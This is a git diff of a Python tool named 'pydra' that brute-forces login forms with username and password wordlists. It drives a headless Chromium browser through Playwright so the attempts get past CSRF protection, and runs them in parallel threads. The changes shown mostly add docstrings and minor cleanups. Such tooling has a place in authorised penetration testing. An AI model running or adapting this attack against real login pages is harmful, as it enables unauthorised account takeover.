@@ -1,19 +1,33 @@
+"""
+Script that does user password bruteforcing from a wordlist.
+Originally I was trying to do it with thc-hydra, however,
+that tool does not work with CSRF protection.
+This tool makes the attempts from the browser itself by using
+playwright, thereforece there are no CSRF issues.
+"""
+
 import argparse
-from dataclasses import dataclass
 from concurrent.futures import ThreadPoolExecutor
 from playwright.sync_api import sync_playwright
 
 
 def debug(msg, args):
+    """
+    prints a debug message if verbose option is passed
+    """
     if args.verbose:
         print(msg)
 
 
 def login_attempt(executor_args):
+    """
+    attemps a login attempt with the passed user, password.
+    It starts a new browser for each login attempt.
+    """
     user, password, args = executor_args
     debug(f"logging attempt with {user} and {password}", args)
-    with sync_playwright() as p:
-        browser = p.chromium.launch(headless=not args.show_browser)
+    with sync_playwright() as play_wright:
+        browser = play_wright.chromium.launch(headless=not args.show_browser)
         page = browser.new_page()
         page.goto(args.login_form_url)
         page.wait_for_url(args.login_form_url)
@@ -33,6 +47,9 @@ def login_attempt(executor_args):
 
 
 def get_args():
+    """
+    parses the cli arguments
+    """
     parser = argparse.ArgumentParser(
         prog='pydra',
         description='pydra does username/password brute force cracking using \
@@ -51,13 +68,20 @@ def get_args():
 
     return parser.parse_args()
 
+
 def load_word_list(word_list_file):
-    with open(word_list_file, 'r') as wlf:
+    """
+    load a word list
+    """
+    with open(word_list_file, 'r', encoding='utf-8') as wlf:
         lines = wlf.readlines()
         return [line.rstrip() for line in lines]
 
 
 def brute_force():
+    """
+    performs the brute force attack with a pool of threads
+    """
     args = get_args()
     users = load_word_list(args.user_list)
     passwords = load_word_list(args.passwd_list)
